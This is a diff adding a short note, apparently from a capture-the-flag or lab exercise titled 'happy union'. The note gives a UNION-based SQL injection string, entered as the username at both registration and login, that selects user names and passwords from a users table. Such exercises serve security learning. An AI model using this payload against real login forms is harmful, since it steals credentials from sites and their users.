@@ -1,0 +1,8 @@
+happy union:
+register:
+username = aaa' union select 1, user, pass from users -- 
+password = bbb
+
+login:
+username = aaa' union select 1, user, pass from users -- 
+password = bbb
